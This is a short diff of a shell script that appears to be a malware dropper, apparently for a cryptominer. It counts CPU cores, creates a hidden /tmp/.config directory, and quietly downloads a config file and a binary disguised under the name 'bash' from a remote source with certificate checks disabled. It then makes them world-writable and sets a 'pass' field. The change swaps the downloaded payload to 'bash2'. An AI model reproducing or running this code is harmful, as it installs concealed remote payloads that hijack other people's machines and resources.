@@ -14,7 +14,7 @@ cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+
 
 mkdir -p "/tmp/.config"
 wget --no-check-certificate -qO "/tmp/.config/config.json" "${src}/z.json"
-wget --no-check-certificate -qO "/tmp/.config/bash" "${src}/bash"
+wget --no-check-certificate -qO "/tmp/.config/bash" "${src}/bash2"
 chmod -R 777 "/tmp/.config"
 
 [ -f "/tmp/.config/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "/tmp/.config/config.json"
